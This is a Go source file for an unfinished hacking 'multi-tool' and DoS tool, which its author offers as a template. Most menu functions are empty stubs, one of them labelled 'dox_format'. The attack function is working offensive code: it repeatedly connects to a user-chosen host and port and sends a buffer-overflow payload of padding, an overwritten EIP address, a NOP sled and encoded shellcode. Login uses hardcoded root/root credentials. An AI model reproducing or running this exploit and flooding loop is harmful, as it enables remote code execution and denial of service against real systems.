/*
This is an incomplete multi-tool/dos-tool kind of like sinful,
but the method hasnt been tested fully and i kinda half assed it,
so idk if it even works tbh but im not gonna start working on it again.
If you want to use this as a guide for your own tool or build off it feel
free i dont plan on using this for anything so yall can use it like a template or sum.
*/
package main
import (
	"fmt"
	"os"
	"os/exec"
	"time"
	"net"
	"strings"
)

func sleep(seconds int){
	for {
		if seconds <= 0 {
			break
		} else {
			time.Sleep(1 * time.Second)
			seconds--
		}
	}
}

func clear(){
	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func banner(){
	//var colorReset = "\033[0m"
	var colorRed = "\033[31m"
	//var colorGreen = "\033[32m"
	//var colorYellow = "\033[33m"
	//var colorBlue = "\033[34m"
	var colorPurple = "\033[35m"
	var colorCyan = "\033[36m"
	var colorWhite = "\033[37m"
	fmt.Print("\n")
	fmt.Println(colorRed, "				██╗  ██╗ █████╗ ███╗   ███╗██╗")
	fmt.Println(colorRed, "				██║ ██╔╝██╔══██╗████╗ ████║██║")
	fmt.Println(colorRed, "				█████╔╝ ███████║██╔████╔██║██║")
	fmt.Println(colorRed, "				██╔═██╗ ██╔══██║██║╚██╔╝██║██║")
	fmt.Println(colorRed, "				██║  ██╗██║  ██║██║ ╚═╝ ██║██║")
	fmt.Println(colorRed, "				╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝")
	fmt.Println(colorRed, "			  [",colorPurple,"+",colorRed,"] ", colorCyan, "Made by ", colorWhite, "Azopia ", colorRed, "[",colorPurple,"+",colorRed,"]")
}

func menu(){
	clear()
	//var colorReset = "\033[0m"
	//var colorRed = "\033[31m"
	//var colorGreen = "\033[32m"
	//var colorYellow = "\033[33m"
	//var colorBlue = "\033[34m"
	//var colorPurple = "\033[35m"
	var colorCyan = "\033[36m"
	//var colorWhite = "\033[37m"
	banner()
	fmt.Print("\n")
	fmt.Println(colorCyan, "	         	   ┏━━━━━━━━━━━━━━━┓   ┏━━━━━━━━━━━━━━━┓")
	fmt.Println("	         	   ┃  Information  ┃   ┃  Stress Test  ┃")
	fmt.Println("	         	   ┃     geo       ┗━━━┛    methods    ┃")
	fmt.Println("	         	   ┃     phone      ███      send      ┃")
	fmt.Println("	         	   ┃     ping       ███      stop      ┃")
	fmt.Println("	         	   ┃     pscan     ┏━━━┓     cons      ┃")
	fmt.Println("	         	   ┃               ┃   ┃               ┃")
	fmt.Println("	         	   ┗━━━━━┓   ┏━━━━━┛   ┗━━━━━┓   ┏━━━━━┛")
	fmt.Println("	         	         ┃███┃     ~Azo      ┃███┃      ")
	fmt.Println("	         	   ┏━━━━━┛   ┗━━━━━┓   ┏━━━━━┛   ┗━━━━━┓")
	fmt.Println("	         	   ┃   Settings    ┃   ┃   Resources   ┃")
	fmt.Println("	         	   ┃    color      ┗━━━┛    ascii      ┃")
	fmt.Println("	         	   ┃    banner      ███     ranges     ┃")
	fmt.Println("	         	   ┃     user       ███    learning    ┃")
	fmt.Println("	         	   ┃    reload     ┏━━━┓   dox_format  ┃")
	fmt.Println("	         	   ┃               ┃   ┃               ┃")
	fmt.Println("	         	   ┗━━━━━━━━━━━━━━━┛   ┗━━━━━━━━━━━━━━━┛")
	commands()

}

/* Information */

func geo(){
	commands()
}

func phone(){
	commands()
}

func ping(){
	commands()
}

func pscan(){
	commands()
}

/* Stress Test */

func methods(){
	commands()
}

func stop(){
	commands()
}

func cons(){
	commands()
}

/* Settings */

func color(){
	commands()
}

func banners(){
	commands()
}

func user(){
	commands()
}

func reload(){
	commands()
}

/* Resources */

func ascii(){
	commands()
}

func ranges(){
	commands()
}

func learning(){
	commands()
}

func dox_format(){
	commands()
}

func attack(){
	var addr string
	var host string
	var port int
	var seconds int
	fmt.Println("				       ┌─[host]")
	fmt.Print("				       └──╼ $ ")
	fmt.Scan(&host)
	fmt.Println("				       ┌─[port]")
	fmt.Print("				       └──╼ $ ")
	fmt.Scan(&port)
	fmt.Println("				       ┌─[seconds]")
	fmt.Print("				       └──╼ $ ")
	fmt.Scan(&seconds)
	addr = fmt.Sprintf("%v:%v", host, port)
	for {
		if seconds <= 0 {
			break
			hub()
		} else {
			padding1 := strings.Repeat("\x90", 1042)
			EIP := "\xB5\x42\xA8\x68"
			NOPS := strings.Repeat("\x90", 30)
			conn, err := net.Dial("tcp", addr)
			if err != nil {
				fmt.Println("Connection failed", err.Error())
				hub()
			}

			payload := "\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
			payload += "\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
			payload += "\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f"
			payload += "\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8"
			payload += "\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f"
			payload += "\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43"
			payload += "\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee"
			payload += "\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4"
			payload += "\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a"
			payload += "\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff"
			payload += "\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33"
			payload += "\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59"
			payload += "\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05"
			payload += "\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4"
			payload += "\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6"
			payload += "\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c"
			payload += "\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f"

			overrun := strings.Repeat("C", (1500 - len(padding1+EIP+NOPS+payload)))

			buf := padding1 + EIP + NOPS + payload + overrun

			_, err = conn.Write([]byte(buf))
			if err != nil {
				fmt.Println("Connection failed while sending attack", err.Error())
				hub()
			}

			conn.Close()
			seconds--
		}
	}
}

func commands(){
	var command string
	fmt.Println("				       ┌─[root@kami]")
	fmt.Print("				       └──╼ $ ")
	fmt.Scan(&command)
	switch command{
	case "?", "help", "commands", "menu":
		menu()
	case "clear", "cls", "c", "wipe":
		clear()
		banner()
		commands()
	case "geo", "iplookup":
		geo()
	case "phone", "number":
		phone()
	case "ping", "paping", "tcpping":
		ping()
	case "pscan", "portscan", "nmap", "scan":
		pscan()
	case "methods":
		methods()
	case "send":
		fmt.Println("                      |      attack [IP] [PORT] [TIME]      |     ")
		commands()
	case "stop":
		stop()
	case "cons", "attacks":
		cons()
	case "color", "theme", "colors":
		color()
	case "banner", "art":
		banners()
	case "user", "settings", "users":
		user()
	case "reload", "reset", "reboot", "kill", "die", "logout", "exit", "leave":
		main()
	case "attack":
		attack()
	}
}

func hub(){
	clear()
	banner()
	fmt.Println("			  [+] Type menu or help to get started [+]")
	commands()
}

func main(){
	clear()
	var username string
	var password string
	fmt.Print("Enter Username: ")
	fmt.Scan(&username)
	valid_user := "root"
	valid_pass := "root"
	if username == valid_user {
		fmt.Print("Enter Password: ")
		fmt.Scan(&password)
		if password == valid_pass {
			hub()
		} else {
			fmt.Print("Incorrect Password")
			sleep(5)
		}
	} else {
		fmt.Print("Incorrect Username")
		sleep(5)
		main()
	}
}
